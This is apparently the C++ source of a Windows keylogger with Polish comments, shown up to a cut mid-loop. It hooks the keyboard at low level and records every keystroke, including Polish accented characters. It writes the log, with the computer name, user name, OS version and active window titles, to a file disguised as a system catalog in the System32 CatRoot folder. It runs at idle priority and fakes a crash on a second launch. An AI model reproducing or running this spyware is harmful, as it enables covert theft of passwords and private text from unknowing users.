#include "./../../../x86_libraries/STK/stk_MAIN.h"
#include "./../../../x86_libraries/STK/database/stk_database.h"
//---------------------------------------------------------------------------
#include <windows.h>
#include <condefs.h>
//---------------------------------------------------------------------------
USELIB("..\..\..\X86_LIBRARIES\STK\stk_lib.lib");
//---------------------------------------------------------------------------
#define EXCED 8192
//---------------------------------------------------------------------------
#define dEXHASLO (char)0x00L  // jesli ró¿ne od 0 to plik jest szyfrowany exORem
//---------------------------------------------------------------------------
#define PRV 0
#define CRT 1
#define USR 2
//---------------------------------------------------------------------------

//---------------------------------------------------------------------------
class TBuforPlikowy
{
//---------------------------------------------------------------------------
private:
//---------------------------------------------------------------------------
struct
  { char *nazwa;
    HANDLE handPlik, handMapa;
  } plik;
void  __stdcall SetNazwaPlikuBufora(char *Nazwa);
//---------------------------------------------------------------------------
public:
//---------------------------------------------------------------------------
struct
  { char *temp, *mapa;
    long size, pos[3];
  } bufor;
     __property char *NazwaPlikuBufora = { read = plik.nazwa, write = SetNazwaPlikuBufora };
//---------------------------------------------------------------------------
      __stdcall TBuforPlikowy        (char *Nazwa);
//---------------------------------------------------------------------------
char *__stdcall load                 (long posEnum, long length);
DWORD __stdcall save                (char *info, long posEnum);
DWORD __stdcall error                (void);
//---------------------------------------------------------------------------
      __stdcall ~TBuforPlikowy       (void);
//---------------------------------------------------------------------------
};
//---------------------------------------------------------------------------

__stdcall TBuforPlikowy::TBuforPlikowy(char *Nazwa)
{
plik.nazwa = stk::cstr::dup(Nazwa);
bufor.temp = (char*)stk::cstr::alloc(EXCED);

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

HANDLE FindHand;
 WIN32_FIND_DATAA *FindData = new WIN32_FIND_DATAA;
stk::cstr::mov(bufor.temp,Nazwa);
for (stk::cstr::replace_chr(bufor.temp,'\\','\0'); stk::cstr::len(bufor.temp) < stk::cstr::len(Nazwa); bufor.temp[stk::cstr::len(bufor.temp)] = '\\')
    {if ((FindHand = FindFirstFileA(bufor.temp,FindData))==INVALID_HANDLE_VALUE)
          CreateDirectoryA(bufor.temp, NULL);
     else FindClose(FindHand);
    }
delete FindData;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

plik.handPlik = CreateFileA(Nazwa,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_DELETE,NULL,OPEN_ALWAYS,NULL,NULL);
if (plik.handPlik==INVALID_HANDLE_VALUE || plik.handPlik==NULL)
   {error();
    return;
   }
bufor.size = GetFileSize(plik.handPlik,NULL);
if (bufor.size==0)
    bufor.size= 1;
plik.handMapa = CreateFileMappingA(plik.handPlik,NULL,PAGE_READWRITE|SEC_RESERVE|SEC_NOCACHE,0,bufor.size,"Shell_MSO32");
if (plik.handMapa==INVALID_HANDLE_VALUE || plik.handMapa==NULL)
   {error();
    return;
   }
bufor.mapa = (char*)MapViewOfFile(plik.handMapa,FILE_MAP_ALL_ACCESS,0,0,0);
if (bufor.mapa==NULL)
   {error();
    return;
   }
bufor.pos[PRV] = bufor.pos[CRT] = stk::cstr::len(bufor.mapa);
}
//---------------------------------------------------------------------------

void  __stdcall TBuforPlikowy::SetNazwaPlikuBufora(char *Nazwa)
{
this->~TBuforPlikowy(); new TBuforPlikowy(Nazwa);
}
//---------------------------------------------------------------------------

char *__stdcall TBuforPlikowy::load(long posEnum, long length)
{
if (bufor.pos[posEnum] + length >= bufor.size)
    return NULL;

bufor.temp = stk::cstr::realloc(bufor.temp,length + 1);
strncpy(bufor.temp,(char*)((unsigned long)bufor.mapa + bufor.pos[posEnum]),length);
for (int p = 0; p < length; p++)
     bufor.temp[p] = bufor.temp[p] ^ dEXHASLO;
return bufor.temp;
}
//---------------------------------------------------------------------------

DWORD __stdcall TBuforPlikowy::save(char *info, long posEnum) {
static DWORD length;
length = stk::cstr::len(info);

if (bufor.pos[posEnum] + length > (unsigned __int32)bufor.size)
   {bufor.size = bufor.pos[posEnum]+length + EXCED;
    UnmapViewOfFile(bufor.mapa);
        CloseHandle(plik.handMapa);
    plik.handMapa = CreateFileMapping(plik.handPlik,NULL,PAGE_READWRITE|SEC_NOCACHE|SEC_RESERVE,0,bufor.size,NULL);
       bufor.mapa = (char*)MapViewOfFile(plik.handMapa,FILE_MAP_ALL_ACCESS,0,0,0);
   }
strncpy((char*)((unsigned long)bufor.mapa+bufor.pos[posEnum]),info,length);

for (int p = 0; p < length; p++)
    {bufor.mapa[bufor.pos[posEnum]+p] = info[p]^dEXHASLO;
    }
bufor.pos[PRV] = bufor.pos[posEnum];
bufor.pos[posEnum] += length;
bufor.pos[CRT] = bufor.pos[posEnum];
return length;
}
//---------------------------------------------------------------------------

DWORD __stdcall TBuforPlikowy::error(void)
{
char lpMsgBuf[256];
MessageBeep(MB_ICONEXCLAMATION);
FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM,
      NULL,GetLastError(),
      MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
      &lpMsgBuf[0],sizeof(lpMsgBuf),NULL);
return MessageBoxA(NULL,lpMsgBuf,"Problem z...",
MB_OKCANCEL + MB_DEFBUTTON1 + MB_ICONERROR);
}
//---------------------------------------------------------------------------

__stdcall TBuforPlikowy::~TBuforPlikowy(void)
{
if (plik.handPlik!=INVALID_HANDLE_VALUE && plik.handPlik!=NULL)
   {CloseHandle(plik.handPlik);
    if (plik.handMapa!=INVALID_HANDLE_VALUE && plik.handMapa!=NULL)
       {CloseHandle(plik.handMapa);
        if (bufor.mapa!=NULL)
            UnmapViewOfFile(bufor.mapa);
       }
   }
stk::cstr::free(plik.nazwa); stk::cstr::free(bufor.temp);
}
//---------------------------------------------------------------------------

DWORD __stdcall error(void)
{
char lpMsgBuf[256];
MessageBeep(MB_ICONEXCLAMATION);
FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM,
      NULL,GetLastError(),
      MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),
      &lpMsgBuf[0],sizeof(lpMsgBuf),NULL);
return MessageBoxA(NULL,lpMsgBuf,"Problem z...",
MB_OKCANCEL + MB_DEFBUTTON1 + MB_ICONERROR);
}

char lpklawisz[1024];
struct tagPressed
{ bool fCtrl, fMenu, fShift;
} Pressed;
TBuforPlikowy *BuforPlikowy1;
HHOOK llkbdhhook;

LRESULT LowLevelKeyboardProc(INT nCode, WPARAM wParam, LPARAM lParam) {
if (nCode!=HC_ACTION)
    return CallNextHookEx(llkbdhhook,nCode,wParam,lParam);
BOOL fProcHandled = false;
KBDLLHOOKSTRUCT *pkbdllhook = (KBDLLHOOKSTRUCT *)lParam;
KEYDOWN:
if (wParam!=WM_KEYDOWN)
   {goto KEYUP;
   }
if (pkbdllhook->vkCode==VK_LMENU || pkbdllhook->vkCode==VK_RMENU)
   {Pressed.fMenu =true;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LCONTROL || pkbdllhook->vkCode==VK_RCONTROL)
   {Pressed.fCtrl =true;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LSHIFT || pkbdllhook->vkCode==VK_RSHIFT)
   {Pressed.fShift =true;
    goto KEYEXIT;
   }
else
   {goto KODY;
   }
KEYUP:
if (wParam!=WM_KEYUP)
   {goto KEYEXIT;
   }
if (pkbdllhook->vkCode==VK_LMENU || pkbdllhook->vkCode==VK_RMENU)
   {Pressed.fMenu = false;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LCONTROL || pkbdllhook->vkCode==VK_RCONTROL)
   {Pressed.fCtrl = false;
    goto KEYEXIT;
   }
else
if (pkbdllhook->vkCode==VK_LSHIFT || pkbdllhook->vkCode==VK_RSHIFT)
   {Pressed.fShift = false;
    goto KEYEXIT;
   }
else
   {goto KEYEXIT;
   }
KODY:
switch (pkbdllhook->vkCode)
{
case VK_LWIN:
     ExitProcess(0);
fProcHandled = true;
break;
}
      if ((GetKeyState(0x14)&0x8000)==0 ? Pressed.fShift==0 : Pressed.fShift!=0)
         {                                                  //caps lock
        if (Pressed.fMenu==0)
            {
             //  MA£E LITERY
             if (pkbdllhook->vkCode=='A')
                {
                 stk::cstr::mov(lpklawisz,"a"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='B')
                {
                 stk::cstr::mov(lpklawisz,"b"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='C')
                {
                 stk::cstr::mov(lpklawisz,"c"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='D')
                {
                 stk::cstr::mov(lpklawisz,"d"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='E')
                {
                 stk::cstr::mov(lpklawisz,"e"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='F')
                {
                 stk::cstr::mov(lpklawisz,"f"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='G')
                {
                 stk::cstr::mov(lpklawisz,"g"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='H')
                {
                 stk::cstr::mov(lpklawisz,"h"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='I')
                {
                 stk::cstr::mov(lpklawisz,"i"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='J')
                {
                 stk::cstr::mov(lpklawisz,"j"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='K')
                {
                 stk::cstr::mov(lpklawisz,"k"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='L')
                {
                 stk::cstr::mov(lpklawisz,"l"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='M')
                {
                 stk::cstr::mov(lpklawisz,"m"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='N')
                {
                 stk::cstr::mov(lpklawisz,"n"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='O')
                {
                 stk::cstr::mov(lpklawisz,"o"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='P')
                {
                 stk::cstr::mov(lpklawisz,"p"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Q')
                {
                 stk::cstr::mov(lpklawisz,"q"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='R')
                {
                 stk::cstr::mov(lpklawisz,"r"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='S')
                {
                 stk::cstr::mov(lpklawisz,"s"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='T')
                {
                 stk::cstr::mov(lpklawisz,"t"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='U')
                {
                 stk::cstr::mov(lpklawisz,"u"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='V')
                {
                 stk::cstr::mov(lpklawisz,"v"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='W')
                {
                 stk::cstr::mov(lpklawisz,"w"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='X')
                {
                 stk::cstr::mov(lpklawisz,"x"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Y')
                {
                 stk::cstr::mov(lpklawisz,"y"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Z')
                {
                 stk::cstr::mov(lpklawisz,"z"); goto zapisz;
                }
             }
          else
             {
              //  MA£E Z OGONKAMI
              if (pkbdllhook->vkCode=='A')
                 {
                  stk::cstr::mov(lpklawisz,"\¹"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='C')
                 {
                  stk::cstr::mov(lpklawisz,"\æ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='E')
                 {
                  stk::cstr::mov(lpklawisz,"\ê"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='L')
                 {
                  stk::cstr::mov(lpklawisz,"\³"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='N')
                 {
                  stk::cstr::mov(lpklawisz,"\ñ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='O')
                 {
                  stk::cstr::mov(lpklawisz,"\ó"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='S')
                 {
                  stk::cstr::mov(lpklawisz,"\œ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='X')
                 {
                  stk::cstr::mov(lpklawisz,"\Ÿ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Z')
                 {
                  stk::cstr::mov(lpklawisz,"\¿"); goto zapisz;
                 }
             }
         }
      else //DU¯E
         {
        if (Pressed.fMenu==0)
           {
             //  DU¯E LITERY
             if (pkbdllhook->vkCode=='A')
                {
                 stk::cstr::mov(lpklawisz,"A"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='B')
                {
                 stk::cstr::mov(lpklawisz,"B"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='C')
                {
                 stk::cstr::mov(lpklawisz,"C"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='D')
                {
                 stk::cstr::mov(lpklawisz,"D"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='E')
                {
                 stk::cstr::mov(lpklawisz,"E"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='F')
                {
                 stk::cstr::mov(lpklawisz,"F"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='G')
                {
                 stk::cstr::mov(lpklawisz,"G"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='H')
                {
                 stk::cstr::mov(lpklawisz,"H"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='I')
                {
                 stk::cstr::mov(lpklawisz,"I"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='J')
                {
                 stk::cstr::mov(lpklawisz,"J"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='K')
                {
                 stk::cstr::mov(lpklawisz,"K"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='L')
                {
                 stk::cstr::mov(lpklawisz,"L"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='M')
                {
                 stk::cstr::mov(lpklawisz,"M"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='N')
                {
                 stk::cstr::mov(lpklawisz,"N"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='O')
                {
                 stk::cstr::mov(lpklawisz,"O"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='P')
                {
                 stk::cstr::mov(lpklawisz,"P"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Q')
                {
                 stk::cstr::mov(lpklawisz,"Q"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='R')
                {
                 stk::cstr::mov(lpklawisz,"R"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='S')
                {
                 stk::cstr::mov(lpklawisz,"S"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='T')
                {
                 stk::cstr::mov(lpklawisz,"T"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='U')
                {
                 stk::cstr::mov(lpklawisz,"U"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='V')
                {
                 stk::cstr::mov(lpklawisz,"V"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='W')
                {
                 stk::cstr::mov(lpklawisz,"W"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='X')
                {
                 stk::cstr::mov(lpklawisz,"X"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Y')
                {
                 stk::cstr::mov(lpklawisz,"Y"); goto zapisz;
                }
             if (pkbdllhook->vkCode=='Z')
                {
                 stk::cstr::mov(lpklawisz,"Z"); goto zapisz;
                }
             }
          else
             {
              //  DU¯E Z OGONKAMI
              if (pkbdllhook->vkCode=='A')
                 {
                  stk::cstr::mov(lpklawisz,"\¥"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='C')
                 {
                  stk::cstr::mov(lpklawisz,"\Æ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='E')
                 {
                  stk::cstr::mov(lpklawisz,"\Ê"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='L')
                 {
                  stk::cstr::mov(lpklawisz,"\£"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='N')
                 {
                  stk::cstr::mov(lpklawisz,"\Ñ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='O')
                 {
                  stk::cstr::mov(lpklawisz,"\Ó"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='S')
                 {
                 stk::cstr::mov(lpklawisz,"\Œ"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='X')
                 {
                  stk::cstr::mov(lpklawisz,"\"); goto zapisz;
                 }
              if (pkbdllhook->vkCode=='Z')
                 {
                  stk::cstr::mov(lpklawisz,"\¯"); goto zapisz;
                 }
             }
         }
      if (Pressed.fMenu==0 && Pressed.fShift==0)
         {
          //
          // normalne liczby i znaki specjalne
          //
          if (pkbdllhook->vkCode=='1')
             {
              stk::cstr::mov(lpklawisz,"1"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='2')
             {
              stk::cstr::mov(lpklawisz,"2"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='3')
             {
              stk::cstr::mov(lpklawisz,"3"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='4')
             {
              stk::cstr::mov(lpklawisz,"4"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='5')
             {
              stk::cstr::mov(lpklawisz,"5"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='6')
             {
              stk::cstr::mov(lpklawisz,"6"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='7')
             {
              stk::cstr::mov(lpklawisz,"7"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='8')
             {
              stk::cstr::mov(lpklawisz,"8"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='9')
             {
              stk::cstr::mov(lpklawisz,"9"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='0')
             {
              stk::cstr::mov(lpklawisz,"0"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBD)
             {
              stk::cstr::mov(lpklawisz,"\-"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBB)
             {
              stk::cstr::mov(lpklawisz,"\="); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDC)
             {
              stk::cstr::mov(lpklawisz,"\\"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDB)
             {
              stk::cstr::mov(lpklawisz,"\["); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDD)
             {
              stk::cstr::mov(lpklawisz,"\]"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBA)
             {
              stk::cstr::mov(lpklawisz,"\;"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDE)
             {
              stk::cstr::mov(lpklawisz,"\'"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBC)
             {
              stk::cstr::mov(lpklawisz,"\,"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBE)
             {
              stk::cstr::mov(lpklawisz,"\."); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBF)
             {
              stk::cstr::mov(lpklawisz,"\/"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xC0)
             {
              stk::cstr::mov(lpklawisz,"\`"); goto zapisz;
             }
         }
      if (Pressed.fMenu!=0 && Pressed.fShift==0)
         {
          // SZIT znaki specjalne
          if (pkbdllhook->vkCode=='1')
             {
              stk::cstr::mov(lpklawisz,"\!"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='2')
             {
              stk::cstr::mov(lpklawisz,"\@"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='3')
             {
              stk::cstr::mov(lpklawisz,"\#"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='4')
             {
              stk::cstr::mov(lpklawisz,"\$"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='5')
             {
              stk::cstr::mov(lpklawisz,"\%"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='6')
             {
              stk::cstr::mov(lpklawisz,"\^"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='7')
             {
              stk::cstr::mov(lpklawisz,"\&"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='8')
             {
              stk::cstr::mov(lpklawisz,"\*"); goto zapisz;
             }
          if (pkbdllhook->vkCode=='9')
             {
              stk::cstr::mov(lpklawisz,"\("); goto zapisz;
             }
          if (pkbdllhook->vkCode=='0')
             {
              stk::cstr::mov(lpklawisz,"\)"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBD)
             {
              stk::cstr::mov(lpklawisz,"\_"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBB)
             {
              stk::cstr::mov(lpklawisz,"\+"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDC)
             {
              stk::cstr::mov(lpklawisz,"\|"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDB)
             {
              stk::cstr::mov(lpklawisz,"\{"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDD)
             {
              stk::cstr::mov(lpklawisz,"\}"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBA)
             {
              stk::cstr::mov(lpklawisz,"\:"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xDE)
             {
              stk::cstr::mov(lpklawisz,"\""); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBC)
             {
              stk::cstr::mov(lpklawisz,"\<"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBE)
             {
              stk::cstr::mov(lpklawisz,"\>"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xBF)
             {
              stk::cstr::mov(lpklawisz,"\?"); goto zapisz;
             }
          if (pkbdllhook->vkCode==0xC0)
             {
              stk::cstr::mov(lpklawisz,"\~"); goto zapisz;
             }
         }
      if (Pressed.fMenu==0 && (GetKeyState(VK_NUMLOCK)&0x8000)!=0)
         {
          // NUM
          if (pkbdllhook->vkCode==VK_NUMPAD0) //num
             {
              stk::cstr::mov(lpklawisz,"0"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD1) //num
             {
              stk::cstr::mov(lpklawisz,"1"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD2) //num
             {
              stk::cstr::mov(lpklawisz,"2"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD3) //num
             {
              stk::cstr::mov(lpklawisz,"3"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD4) //num
             {
              stk::cstr::mov(lpklawisz,"4"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD5) //num
             {
              stk::cstr::mov(lpklawisz,"5"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD6) //num
             {
              stk::cstr::mov(lpklawisz,"6"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD7) //num
             {
              stk::cstr::mov(lpklawisz,"7"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD8) //num
             {
              stk::cstr::mov(lpklawisz,"8"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_NUMPAD9) //num
             {
              stk::cstr::mov(lpklawisz,"9"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_MULTIPLY)
             {
              stk::cstr::mov(lpklawisz,"\*"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_ADD) //num
             {
              stk::cstr::mov(lpklawisz,"\+"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_SUBTRACT) //num
             {
              stk::cstr::mov(lpklawisz,"\-"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_DECIMAL) //num
             {
              stk::cstr::mov(lpklawisz,"\,"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_DIVIDE) //num
             {
              stk::cstr::mov(lpklawisz,"\/"); goto zapisz;
             }
         }
      if ((Pressed.fMenu)==0)
         {
          // nienormalne
          if (pkbdllhook->vkCode==VK_SPACE)
             {
              stk::cstr::mov(lpklawisz,"\ "); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_TAB)
             {
              stk::cstr::mov(lpklawisz,"\t"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_RETURN)
             {
              stk::cstr::mov(lpklawisz,"\r\n"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_BACK)
             {
              stk::cstr::mov(lpklawisz,"[Bck]"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_DELETE)
             {
              stk::cstr::mov(lpklawisz,"[Del]"); goto zapisz;
             }
          if (pkbdllhook->vkCode==VK_ESCAPE)
             {
              stk::cstr::mov(lpklawisz,"[Esc]"); goto zapisz;
             }
         }
   goto KEYEXIT; // omin
zapisz:
   BuforPlikowy1->save(lpklawisz,CRT); // << Z GOTO
return (fProcHandled ? TRUE : CallNextHookEx(llkbdhhook,nCode,wParam,lParam));
KEYEXIT:
return  CallNextHookEx(llkbdhhook,nCode,wParam,lParam);
}
//---------------------------------------------------------------------------

WINAPI WinMain(HINSTANCE HInstance, HINSTANCE, LPSTR, int)
{
Pressed.fCtrl = Pressed.fMenu = Pressed.fShift = false;
llkbdhhook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc,GetModuleHandle(NULL), 0);
SetPriorityClass(GetCurrentProcess(),IDLE_PRIORITY_CLASS); // aby nie przeszkadza³
// blokada kilkukrotnego startu
HANDLE hInstanceMutex = ::CreateMutexA(NULL,TRUE,"Key32Mutex");
if (GetLastError()==ERROR_ALREADY_EXISTS)
   {char *errorek1 = (char*)0;
    char *errorek2 = (char*)0xFFFFFFFF;
    errorek1[0] = errorek2[0]; // niby fatal errror a tak naprawdê informacja o uruchomieniu
    return -1;
   }
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SYSTEMTIME SystemTime;
GetLocalTime(&SystemTime);
char *lpnazwa = stk::cstr::alloc(256);
GetSystemDirectoryA(lpnazwa,255);
stk::cstr::cat(lpnazwa,"\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\MSO32X.cat");
BuforPlikowy1 = new TBuforPlikowy(lpnazwa);
stk::cstr::free(lpnazwa);

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

char *HWNDlpTextCrt = stk::cstr::allocex(256,""); //nazw current okna
char *HWNDlpTextPrv = stk::cstr::allocex(256,""); //nazwa ostatnio aktywnego okna
char *HWNDlpTextLog = stk::cstr::allocex(256,""); //nazwa do wpisu
char *HWNDlpTextTmp = stk::cstr::allocex(256,""); //nazw temp
//
HWND HWNDIdCrt;
HWND HWNDIdPrv = 0;
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
// jeœli by³y poprzednie wpisy to trzeba je rozdzieliæ
//
if (BuforPlikowy1->bufor.pos[CRT] > 1)
    BuforPlikowy1->save("\r\n\r\n",CRT);
stk::cstr::mov(HWNDlpTextLog,"[*%Info o logu%*]:");
//
// data i czas
//
GetDateFormatA(LOCALE_USER_DEFAULT,0,&SystemTime,"'Data='dd'.'MM'.'yyyy",HWNDlpTextTmp,255);
stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
GetTimeFormatA(LOCALE_USER_DEFAULT,0,&SystemTime,"', Czas='HH'.'mm'.'ss",HWNDlpTextTmp,255);
stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
//
// wpis nazwy komputera i urzytkownika
//
unsigned long tempLong = 255;
//
GetComputerNameA(HWNDlpTextTmp,&tempLong);
stk::cstr::cat(HWNDlpTextLog,", Komp=");
stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
GetUserNameA(HWNDlpTextTmp,&tempLong);
stk::cstr::cat(HWNDlpTextLog,", User=");
stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
//
// wpis rodzaju systemu
//
LPOSVERSIONINFOA lpVersionInformation = new OSVERSIONINFOA;
lpVersionInformation->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

if (GetVersionExA(lpVersionInformation))
   {
     char lpVersionNumber[64];
   stk::cstr::mov(lpVersionNumber,stk::cstr::itoa(lpVersionInformation->dwMajorVersion));
   stk::cstr::cat(lpVersionNumber,"\.");
   stk::cstr::cat(lpVersionNumber,stk::cstr::itoa(lpVersionInformation->dwMajorVersion));
   //
   if (lpVersionInformation->dwPlatformId == VER_PLATFORM_WIN32_NT)
      {
       stk::cstr::cat(HWNDlpTextLog,", OS=WinNT ");
       stk::cstr::cat(HWNDlpTextLog,lpVersionNumber);
       stk::cstr::cat(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
      }
   else
      {
       stk::cstr::cat(HWNDlpTextLog,", OS=Win9X ");
       stk::cstr::cat(HWNDlpTextLog,lpVersionNumber);
       stk::cstr::cat(HWNDlpTextLog,lpVersionInformation->szCSDVersion);
      }
   }
stk::cstr::cat(HWNDlpTextLog,"\r\n");
//
BuforPlikowy1->save(HWNDlpTextLog,CRT); // post
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
for (BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[PRV] = BuforPlikowy1->bufor.pos[CRT];; Sleep(10000))
    {
    //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ sprawdzam czy zmieni³o si.ê okno
    //
    if  ((unsigned __int16)GetAsyncKeyState(VK_LBUTTON)!=0x8000 && (unsigned __int16)GetAsyncKeyState(0)!=0x8000 && HWNDIdPrv == (HWNDIdCrt=GetForegroundWindow()))
         continue;

    GetWindowTextA(HWNDIdCrt,HWNDlpTextCrt,255);

    if (strcmp(HWNDlpTextPrv,HWNDlpTextCrt)!=0)
       {
        HWNDIdPrv = HWNDIdCrt;
        //
        if (BuforPlikowy1->bufor.pos[PRV] < BuforPlikowy1->bufor.pos[CRT])
            BuforPlikowy1->bufor.pos[USR] = BuforPlikowy1->bufor.pos[CRT]; // jeœli coœ naciœniête to OK nowa nadpisywalna pozycja
